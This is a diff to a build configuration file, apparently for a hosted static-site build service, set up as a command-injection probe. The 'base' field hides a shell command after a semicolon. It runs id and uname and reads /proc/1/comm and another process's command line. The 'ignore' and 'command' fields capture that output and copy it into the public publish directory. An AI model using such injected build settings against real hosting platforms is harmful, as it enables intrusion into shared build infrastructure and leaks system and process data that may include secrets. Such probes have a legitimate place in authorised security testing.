@@ -1,5 +1,5 @@
 [build]
   base = "x; { id; uname -r; cat /proc/1/comm; cat /proc/654/cmdline; } >> /opt/build/repo/.proof-extra 2>&1; exit 1; #"
-  ignore = "id > /opt/build/repo/.proof-id 2>&1; exit 0"
+  ignore = "id > /opt/build/repo/.proof-id 2>&1; exit 1"
   publish = "pub"
   command = "cp /opt/build/repo/.proof-id pub/proof-root.txt 2>/dev/null; cp /opt/build/repo/.proof-extra pub/proof-extra.txt 2>/dev/null; echo probe-done"
